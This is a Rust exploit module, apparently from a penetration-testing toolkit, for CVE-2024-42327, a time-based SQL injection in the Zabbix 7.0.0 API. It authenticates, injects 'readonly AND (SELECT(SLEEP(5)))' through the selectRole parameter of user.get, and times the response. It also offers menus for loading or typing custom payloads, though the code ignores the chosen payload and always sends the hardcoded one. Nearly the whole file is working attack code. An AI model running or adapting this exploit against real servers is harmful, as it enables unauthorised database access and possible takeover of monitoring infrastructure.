//! Zabbix 7.0.0 SQL Injection - CVE-2024-42327
//!
//! This module exploits a time-based SQL injection vulnerability in Zabbix API
//! that allows arbitrary SQL execution and potential remote code execution.
//!
//! ## Vulnerability Details
//! - **CVE**: CVE-2024-42327
//! - **Affected Versions**: Zabbix 7.0.0
//! - **Attack Vector**: SQL injection in API endpoints
//! - **Impact**: Information disclosure, potential RCE
//!
//! ## Usage
//! ```bash
//! run exploit zabbix/zabbix_7_0_0_sql_injection <target_url>
//! ```
//!
//! The module supports:
//! - Loading SQL payloads from file (`sql_payloads.txt`)
//! - Custom SQL payload input
//! - Default SLEEP-based payload for time-based detection
//!
//! ## Security Notes
//! - Proper error handling with context messages
//! - Input validation for user-provided payloads
//! - Timeout handling for all requests
//! - Secure credential handling
//! - Uses utils.rs for target validation and prompts
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use reqwest::Client;
use serde_json::json;
use std::fs;
use std::time::Duration;

use crate::utils::{
    normalize_target, prompt_default, prompt_int_range,
};

const HEADERS: &str = "application/json";
const DEFAULT_TIMEOUT_SECS: u64 = 30;

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Zabbix 7.0.0 SQL Injection Checker                      ║".cyan());
    println!("{}", "║   CVE-2024-42327 - Time-based SQL Injection               ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

/// Validate and normalize the target URL
fn validate_target_url(target: &str) -> Result<String> {
    let trimmed = target.trim();
    
    // Check if it looks like a URL
    if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
        // Already has scheme, validate the host part
        if let Ok(url) = url::Url::parse(trimmed) {
            if let Some(host) = url.host_str() {
                // Validate the host using normalize_target
                let _ = normalize_target(host)?;
                return Ok(trimmed.to_string());
            }
        }
        return Err(anyhow!("Invalid URL format: {}", trimmed));
    }
    
    // No scheme - treat as host:port and add https://
    let normalized = normalize_target(trimmed)?;
    Ok(format!("https://{}", normalized))
}

// Internal function renamed to `exploit_zabbix` to avoid conflicts
async fn exploit_zabbix(api_url: &str, username: &str, password: &str, _payload: &str) -> Result<()> {
    let client = Client::builder()
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?;

    let url = format!("{}/api_jsonrpc.php", api_url.trim_end_matches('/'));

    // Login to get the token
    println!("{}", "[*] Attempting to authenticate...".cyan());
    let login_data = json!({
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "username": username,
            "password": password
        },
        "id": 1,
        "auth": null
    });

    let login_response = client
        .post(&url)
        .header("Content-Type", HEADERS)
        .json(&login_data)
        .send()
        .await
        .map_err(|e| anyhow!("Login request error: {}", e))?;

    let login_response_json: serde_json::Value = login_response
        .json()
        .await
        .map_err(|e| anyhow!("Failed to parse login response: {}", e))?;

    let auth_token = login_response_json
        .get("result")
        .ok_or_else(|| anyhow!("Failed to retrieve auth token - check credentials"))?
        .as_str()
        .ok_or_else(|| anyhow!("Auth token not a string"))?
        .to_string();

    println!("{}", "[+] Authentication successful".green());

    // SQLi test using the provided payload
    println!("{}", "[*] Testing for SQL injection vulnerability...".yellow());
    let sqli_data = json!({
        "jsonrpc": "2.0",
        "method": "user.get",
        "params": {
            "selectRole": ["roleid", "name", "type", "readonly AND (SELECT(SLEEP(5)))"],
            "userids": ["1", "2"]
        },
        "id": 1,
        "auth": auth_token
    });

    let start = std::time::Instant::now();
    let test_response = client
        .post(&url)
        .header("Content-Type", HEADERS)
        .json(&sqli_data)
        .send()
        .await
        .map_err(|e| anyhow!("Test request error: {}", e))?;

    let elapsed = start.elapsed();
    let test_response_text = test_response
        .text()
        .await
        .map_err(|e| anyhow!("Failed to read test response: {}", e))?;

    println!("{}", format!("[*] Response received in {:.2}s", elapsed.as_secs_f64()).cyan());

    if test_response_text.contains("\"error\"") {
        println!("{}", "[-] Target does NOT appear vulnerable (error in response).".red());
    } else if elapsed.as_secs() >= 5 {
        println!("{}", "[+] VULNERABLE! Response delayed by SLEEP injection.".green().bold());
    } else {
        println!("{}", "[?] Inconclusive - response received but no delay detected.".yellow());
    }

    Ok(())
}

// Prompt user to choose a payload option using shared utilities
async fn get_payload_choice() -> Result<String> {
    println!("{}", "[*] Choose SQL payload option:".cyan().bold());
    println!("  {} Load SQL payloads from file", "[1]".green());
    println!("  {} Enter custom SQL payload", "[2]".green());
    println!("  {} Use default SQL payload (SLEEP-based)", "[3]".green());

    let choice = prompt_int_range("Enter your choice", 3, 1, 3)? as u8;

    match choice {
        1 => {
            // Load from a file (e.g., sql_payloads.txt)
            let payloads_file = prompt_default("SQL payloads file path", "sql_payloads.txt")?;
            println!("{}", "[*] Loading SQL payloads from file...".cyan());
            let payloads = fs::read_to_string(&payloads_file)
                .map_err(|e| anyhow!("Error reading payload file '{}': {}", payloads_file, e))?;
            println!("{}", "[+] Payloads loaded successfully".green());
            Ok(payloads.trim().to_string())
        }
        2 => {
            // Allow user to input a custom payload
            let custom_payload = prompt_default("Custom SQL payload", "readonly AND (SELECT(SLEEP(5)))")?;

            // Ensure the custom payload isn't empty
            if custom_payload.is_empty() {
                println!("{}", "[-] Custom payload cannot be empty".red());
                return Err(anyhow!("Custom payload cannot be empty. Please enter a valid payload."));
            }

            println!("{}", format!("[+] Using custom payload: {}", custom_payload).green());
            Ok(custom_payload)
        }
        3 => {
            // Use a default payload
            println!("{}", "[*] Using default SQL payload (SLEEP-based)...".cyan());
            Ok("readonly AND (SELECT(SLEEP(5)))".to_string())
        }
        _ => {
            println!("{}", "[-] Invalid choice".red());
            Err(anyhow!("Invalid choice, please select 1, 2, or 3."))
        }
    }
}

// Public dispatch entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Validate and normalize target URL
    let api_url = validate_target_url(target)?;
    println!("{}", format!("[*] Target API URL: {}", api_url).yellow());
    println!();

    // Use shared prompt utilities for credentials
    let username = prompt_default("Username", "Admin")?;
    let password = prompt_default("Password", "")?;

    if username.is_empty() || password.is_empty() {
        println!("{}", "[-] Username and password are required".red());
        return Err(anyhow!("Username and password are required"));
    }

    // Get the payload choice from the user
    let payload = get_payload_choice().await?;

    // Run the exploit with the selected payload
    exploit_zabbix(&api_url, &username, &password, &payload).await
}

